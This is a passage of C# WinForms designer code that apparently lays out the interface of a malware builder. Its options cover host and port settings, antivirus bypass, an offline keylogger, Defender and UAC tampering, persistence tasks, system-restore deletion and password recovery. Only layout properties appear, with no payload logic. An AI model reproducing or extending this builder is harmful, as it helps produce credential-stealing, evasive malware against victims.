        this.bunifuShadowPanel5.Controls.Add(this.bunifuSeparator4);
        this.bunifuShadowPanel5.Controls.Add(this.bunifuLabel54);
        this.bunifuShadowPanel5.Controls.Add(this.LogsList);
        this.bunifuShadowPanel5.Dock = System.Windows.Forms.DockStyle.Fill;
        this.bunifuShadowPanel5.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel5.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel5.Location = new System.Drawing.Point(0, 0);
        this.bunifuShadowPanel5.Name = "bunifuShadowPanel5";
        this.bunifuShadowPanel5.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel5.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel5.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuShadowPanel5.ShadowDept = 2;
        this.bunifuShadowPanel5.ShadowDepth = 9;
        this.bunifuShadowPanel5.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel5.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel5.Size = new System.Drawing.Size(944, 487);
        this.bunifuShadowPanel5.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel5.TabIndex = 45;
        // 
        // ClearListLogs
        // 
        this.ClearListLogs.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.ClearListLogs.AutoSize = true;
        this.ClearListLogs.Font = new System.Drawing.Font("Consolas", 9F);
        this.ClearListLogs.LinkColor = System.Drawing.Color.Blue;
        this.ClearListLogs.Location = new System.Drawing.Point(845, 453);
        this.ClearListLogs.Name = "ClearListLogs";
        this.ClearListLogs.Size = new System.Drawing.Size(77, 14);
        this.ClearListLogs.TabIndex = 590;
        this.ClearListLogs.TabStop = true;
        this.ClearListLogs.Text = "List Clear";
        this.ClearListLogs.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.ClearListLogs_LinkClicked);
        // 
        // bunifuSeparator4
        // 
        this.bunifuSeparator4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator4.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator4.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator4.BackgroundImage")));
        this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator4.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator4.LineThickness = 1;
        this.bunifuSeparator4.Location = new System.Drawing.Point(8, 437);
        this.bunifuSeparator4.Name = "bunifuSeparator4";
        this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator4.Size = new System.Drawing.Size(924, 11);
        this.bunifuSeparator4.TabIndex = 589;
        // 
        // bunifuLabel54
        // 
        this.bunifuLabel54.AllowParentOverrides = false;
        this.bunifuLabel54.AutoEllipsis = false;
        this.bunifuLabel54.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel54.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel54.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuLabel54.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel54.Location = new System.Drawing.Point(23, 26);
        this.bunifuLabel54.Name = "bunifuLabel54";
        this.bunifuLabel54.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel54.Size = new System.Drawing.Size(505, 15);
        this.bunifuLabel54.TabIndex = 578;
        this.bunifuLabel54.Text = "This list has nothing to do except to log for you everything the program does in " +
"the background";
        this.bunifuLabel54.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel54.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // LogsList
        // 
        this.LogsList.AllowUserToAddRows = false;
        this.LogsList.AllowUserToDeleteRows = false;
        this.LogsList.AllowUserToResizeColumns = false;
        this.LogsList.AllowUserToResizeRows = false;
        dataGridViewCellStyle18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.LogsList.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle18;
        this.LogsList.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.LogsList.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.LogsList.BackgroundColor = System.Drawing.Color.White;
        this.LogsList.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.LogsList.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.LogsList.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.LogsList.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle19.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle19.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(234)))), ((int)(((byte)(235)))), ((int)(((byte)(238)))));
        dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.DimGray;
        dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.LogsList.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle19;
        this.LogsList.ColumnHeadersHeight = 30;
        this.LogsList.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.LogsList.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column15,
            this.Column16,
            this.Column17});
        dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle20.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle20.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle20.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle20.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        dataGridViewCellStyle20.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle20.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.LogsList.DefaultCellStyle = dataGridViewCellStyle20;
        this.LogsList.EnableHeadersVisualStyles = false;
        this.LogsList.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.LogsList.Location = new System.Drawing.Point(9, 60);
        this.LogsList.Name = "LogsList";
        this.LogsList.ReadOnly = true;
        this.LogsList.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.LogsList.RowHeadersVisible = false;
        this.LogsList.RowHeadersWidth = 40;
        this.LogsList.RowTemplate.Height = 30;
        this.LogsList.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.LogsList.Size = new System.Drawing.Size(926, 378);
        this.LogsList.TabIndex = 487;
        this.LogsList.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.LogsList.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.LogsList.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.LogsList.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.LogsList.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.LogsList.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.LogsList.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.LogsList.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.LogsList.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        this.LogsList.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.LogsList.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.LogsList.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.LogsList.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.LogsList.ThemeStyle.HeaderStyle.Height = 30;
        this.LogsList.ThemeStyle.ReadOnly = true;
        this.LogsList.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.LogsList.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.LogsList.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.LogsList.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.LogsList.ThemeStyle.RowsStyle.Height = 30;
        this.LogsList.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        this.LogsList.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.Black;
        // 
        // Column15
        // 
        this.Column15.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
        this.Column15.FillWeight = 30F;
        this.Column15.HeaderText = "Type";
        this.Column15.Name = "Column15";
        this.Column15.ReadOnly = true;
        this.Column15.Width = 50;
        // 
        // Column16
        // 
        this.Column16.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column16.HeaderText = "Time";
        this.Column16.Name = "Column16";
        this.Column16.ReadOnly = true;
        this.Column16.Resizable = System.Windows.Forms.DataGridViewTriState.True;
        this.Column16.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
        this.Column16.Width = 42;
        // 
        // Column17
        // 
        this.Column17.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column17.HeaderText = "Message";
        this.Column17.Name = "Column17";
        this.Column17.ReadOnly = true;
        this.Column17.Resizable = System.Windows.Forms.DataGridViewTriState.True;
        this.Column17.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
        // 
        // Page5
        // 
        this.Page5.BackColor = System.Drawing.Color.White;
        this.Page5.Controls.Add(this.PanelBuilder);
        this.Page5.Location = new System.Drawing.Point(4, 4);
        this.Page5.Name = "Page5";
        this.Page5.Size = new System.Drawing.Size(944, 487);
        this.Page5.TabIndex = 4;
        this.Page5.Text = "PageBuilder";
        // 
        // PanelBuilder
        // 
        this.PanelBuilder.Controls.Add(this.bunifuShadowPanel1);
        this.PanelBuilder.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelBuilder.Location = new System.Drawing.Point(0, 0);
        this.PanelBuilder.Name = "PanelBuilder";
        this.PanelBuilder.Size = new System.Drawing.Size(944, 487);
        this.PanelBuilder.TabIndex = 1;
        this.PanelBuilder.Visible = false;
        // 
        // bunifuShadowPanel1
        // 
        this.bunifuShadowPanel1.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel1.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel1.BorderRadius = 20;
        this.bunifuShadowPanel1.BorderThickness = 1;
        this.bunifuShadowPanel1.Controls.Add(this.EnabledRecoveryData);
        this.bunifuShadowPanel1.Controls.Add(this.LabelRecoveryData);
        this.bunifuShadowPanel1.Controls.Add(this.EnabledDiscord);
        this.bunifuShadowPanel1.Controls.Add(this.label2);
        this.bunifuShadowPanel1.Controls.Add(this.bunifuTextBox_0);
        this.bunifuShadowPanel1.Controls.Add(this.pictureBox4);
        this.bunifuShadowPanel1.Controls.Add(this.bunifuLabel1);
        this.bunifuShadowPanel1.Controls.Add(this.ImageBypassAV);
        this.bunifuShadowPanel1.Controls.Add(this.InfoBypassAV);
        this.bunifuShadowPanel1.Controls.Add(this.keyloggerOfflien);
        this.bunifuShadowPanel1.Controls.Add(this.TxkeyloggerOfflien);
        this.bunifuShadowPanel1.Controls.Add(this.PanelDelay);
        this.bunifuShadowPanel1.Controls.Add(this.PanelReDelay);
        this.bunifuShadowPanel1.Controls.Add(this.PanelTask);
        this.bunifuShadowPanel1.Controls.Add(this.BaypassAV);
        this.bunifuShadowPanel1.Controls.Add(this.label28);
        this.bunifuShadowPanel1.Controls.Add(this.Build);
        this.bunifuShadowPanel1.Controls.Add(this.pictureBox1);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderDelay);
        this.bunifuShadowPanel1.Controls.Add(this.TxExDelay);
        this.bunifuShadowPanel1.Controls.Add(this.InsPanel);
        this.bunifuShadowPanel1.Controls.Add(this.DeleteSystemRestore);
        this.bunifuShadowPanel1.Controls.Add(this.TxRestore);
        this.bunifuShadowPanel1.Controls.Add(this.TxHtml);
        this.bunifuShadowPanel1.Controls.Add(this.TxDefault);
        this.bunifuShadowPanel1.Controls.Add(this.HostDefault);
        this.bunifuShadowPanel1.Controls.Add(this.HostHtml);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderInstallation);
        this.bunifuShadowPanel1.Controls.Add(this.TxInstall);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderCreateTask);
        this.bunifuShadowPanel1.Controls.Add(this.TxTask);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderDefender);
        this.bunifuShadowPanel1.Controls.Add(this.TxWD);
        this.bunifuShadowPanel1.Controls.Add(this.bunifuCheckBox_0);
        this.bunifuShadowPanel1.Controls.Add(this.TxUAC);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderProcessMutex);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderPort);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderHost);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderGroup);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderKey);
        this.bunifuShadowPanel1.Controls.Add(this.BuilderDelayConnect);
        this.bunifuShadowPanel1.Controls.Add(this.bunifuSeparator1);
        this.bunifuShadowPanel1.Controls.Add(this.TxDelay);
        this.bunifuShadowPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.bunifuShadowPanel1.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel1.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel1.Location = new System.Drawing.Point(0, 0);
        this.bunifuShadowPanel1.Name = "bunifuShadowPanel1";
        this.bunifuShadowPanel1.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel1.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuShadowPanel1.ShadowDept = 2;
        this.bunifuShadowPanel1.ShadowDepth = 9;
        this.bunifuShadowPanel1.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel1.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel1.Size = new System.Drawing.Size(944, 487);
        this.bunifuShadowPanel1.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel1.TabIndex = 45;
        // 
        // EnabledRecoveryData
        // 
        this.EnabledRecoveryData.AllowBindingControlAnimation = true;
        this.EnabledRecoveryData.AllowBindingControlColorChanges = false;
        this.EnabledRecoveryData.AllowBindingControlLocation = true;
        this.EnabledRecoveryData.AllowCheckBoxAnimation = true;
        this.EnabledRecoveryData.AllowCheckmarkAnimation = true;
        this.EnabledRecoveryData.AllowOnHoverStates = true;
        this.EnabledRecoveryData.AutoCheck = true;
        this.EnabledRecoveryData.BackColor = System.Drawing.Color.Transparent;
        this.EnabledRecoveryData.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnabledRecoveryData.BackgroundImage")));
        this.EnabledRecoveryData.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledRecoveryData.BindingControl = this.LabelRecoveryData;
        this.EnabledRecoveryData.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledRecoveryData.BorderRadius = 6;
        this.EnabledRecoveryData.Checked = false;
        this.EnabledRecoveryData.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledRecoveryData.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledRecoveryData.CustomCheckmarkImage = null;
        this.EnabledRecoveryData.Enabled = false;
        this.EnabledRecoveryData.Location = new System.Drawing.Point(560, 291);
        this.EnabledRecoveryData.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledRecoveryData.Name = "EnabledRecoveryData";
        this.EnabledRecoveryData.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledRecoveryData.OnCheck.BorderRadius = 6;
        this.EnabledRecoveryData.OnCheck.BorderThickness = 2;
        this.EnabledRecoveryData.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledRecoveryData.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledRecoveryData.OnCheck.CheckmarkThickness = 2;
        this.EnabledRecoveryData.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledRecoveryData.OnDisable.BorderRadius = 6;
        this.EnabledRecoveryData.OnDisable.BorderThickness = 2;
        this.EnabledRecoveryData.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledRecoveryData.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledRecoveryData.OnDisable.CheckmarkThickness = 2;
        this.EnabledRecoveryData.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnabledRecoveryData.OnHoverChecked.BorderRadius = 6;
        this.EnabledRecoveryData.OnHoverChecked.BorderThickness = 2;
        this.EnabledRecoveryData.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledRecoveryData.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledRecoveryData.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledRecoveryData.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnabledRecoveryData.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledRecoveryData.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledRecoveryData.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledRecoveryData.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledRecoveryData.OnUncheck.BorderRadius = 6;
        this.EnabledRecoveryData.OnUncheck.BorderThickness = 1;
        this.EnabledRecoveryData.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledRecoveryData.Size = new System.Drawing.Size(21, 21);
        this.EnabledRecoveryData.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledRecoveryData.TabIndex = 654;
        this.EnabledRecoveryData.ThreeState = false;
        this.EnabledRecoveryData.ToolTipText = null;
        // 
        // LabelRecoveryData
        // 
        this.LabelRecoveryData.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.LabelRecoveryData.AutoSize = true;
        this.LabelRecoveryData.BackColor = System.Drawing.Color.Transparent;
        this.LabelRecoveryData.Cursor = System.Windows.Forms.Cursors.Hand;
        this.LabelRecoveryData.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.LabelRecoveryData.ForeColor = System.Drawing.Color.Black;
        this.LabelRecoveryData.Location = new System.Drawing.Point(584, 295);
        this.LabelRecoveryData.Name = "LabelRecoveryData";
        this.LabelRecoveryData.Size = new System.Drawing.Size(147, 15);
        this.LabelRecoveryData.TabIndex = 653;
        this.LabelRecoveryData.Text = "Recovery Data&&Passwords";
        // 
        // EnabledDiscord
        // 
        this.EnabledDiscord.AllowBindingControlAnimation = true;
        this.EnabledDiscord.AllowBindingControlColorChanges = false;
        this.EnabledDiscord.AllowBindingControlLocation = true;
        this.EnabledDiscord.AllowCheckBoxAnimation = true;
        this.EnabledDiscord.AllowCheckmarkAnimation = true;
        this.EnabledDiscord.AllowOnHoverStates = true;
        this.EnabledDiscord.AutoCheck = true;
        this.EnabledDiscord.BackColor = System.Drawing.Color.Transparent;
        this.EnabledDiscord.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnabledDiscord.BackgroundImage")));
        this.EnabledDiscord.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledDiscord.BindingControl = this.label2;
        this.EnabledDiscord.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledDiscord.BorderRadius = 6;
        this.EnabledDiscord.Checked = false;
        this.EnabledDiscord.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledDiscord.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledDiscord.CustomCheckmarkImage = null;
        this.EnabledDiscord.Location = new System.Drawing.Point(373, 291);
        this.EnabledDiscord.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledDiscord.Name = "EnabledDiscord";
        this.EnabledDiscord.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledDiscord.OnCheck.BorderRadius = 6;
        this.EnabledDiscord.OnCheck.BorderThickness = 2;
        this.EnabledDiscord.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledDiscord.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledDiscord.OnCheck.CheckmarkThickness = 2;
        this.EnabledDiscord.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledDiscord.OnDisable.BorderRadius = 6;
        this.EnabledDiscord.OnDisable.BorderThickness = 2;
        this.EnabledDiscord.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledDiscord.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledDiscord.OnDisable.CheckmarkThickness = 2;
        this.EnabledDiscord.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnabledDiscord.OnHoverChecked.BorderRadius = 6;
        this.EnabledDiscord.OnHoverChecked.BorderThickness = 2;
        this.EnabledDiscord.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnabledDiscord.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledDiscord.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledDiscord.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnabledDiscord.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledDiscord.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledDiscord.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledDiscord.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledDiscord.OnUncheck.BorderRadius = 6;
        this.EnabledDiscord.OnUncheck.BorderThickness = 1;
        this.EnabledDiscord.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledDiscord.Size = new System.Drawing.Size(21, 21);
        this.EnabledDiscord.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledDiscord.TabIndex = 652;
        this.EnabledDiscord.ThreeState = false;
        this.EnabledDiscord.ToolTipText = null;
        this.EnabledDiscord.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnabledDiscord_CheckedChanged);
        // 
        // label2
        // 
        this.label2.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label2.AutoSize = true;
        this.label2.BackColor = System.Drawing.Color.Transparent;
        this.label2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label2.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label2.ForeColor = System.Drawing.Color.Black;
        this.label2.Location = new System.Drawing.Point(397, 295);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(138, 15);
        this.label2.TabIndex = 651;
        this.label2.Text = "Send me notif to Discord";
        // 
        // bunifuTextBox_0
        // 
        this.bunifuTextBox_0.AcceptsReturn = false;
        this.bunifuTextBox_0.AcceptsTab = false;
        this.bunifuTextBox_0.AnimationSpeed = 200;
        this.bunifuTextBox_0.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.bunifuTextBox_0.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.bunifuTextBox_0.AutoSizeHeight = true;
        this.bunifuTextBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuTextBox_0.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuTextBox_0.BackgroundImage")));
        this.bunifuTextBox_0.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuTextBox_0.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.bunifuTextBox_0.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.bunifuTextBox_0.BorderColorIdle = System.Drawing.Color.Silver;
        this.bunifuTextBox_0.BorderRadius = 2;
        this.bunifuTextBox_0.BorderThickness = 1;
        this.bunifuTextBox_0.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.bunifuTextBox_0.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.bunifuTextBox_0.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.bunifuTextBox_0.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.bunifuTextBox_0.DefaultText = "";
        this.bunifuTextBox_0.Enabled = false;
        this.bunifuTextBox_0.FillColor = System.Drawing.Color.White;
        this.bunifuTextBox_0.HideSelection = true;
        this.bunifuTextBox_0.IconLeft = ((System.Drawing.Image)(resources.GetObject("bunifuTextBox_0.IconLeft")));
        this.bunifuTextBox_0.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.bunifuTextBox_0.IconPadding = 4;
        this.bunifuTextBox_0.IconRight = null;
        this.bunifuTextBox_0.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.bunifuTextBox_0.Lines = new string[0];
        this.bunifuTextBox_0.Location = new System.Drawing.Point(373, 321);
        this.bunifuTextBox_0.MaxLength = 32767;
        this.bunifuTextBox_0.MinimumSize = new System.Drawing.Size(1, 1);
        this.bunifuTextBox_0.Modified = false;
        this.bunifuTextBox_0.Multiline = false;
        this.bunifuTextBox_0.Name = "bunifuTextBox_0";
        stateProperties65.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties65.FillColor = System.Drawing.Color.Empty;
        stateProperties65.ForeColor = System.Drawing.Color.Empty;
        stateProperties65.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.bunifuTextBox_0.OnActiveState = stateProperties65;
        stateProperties66.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
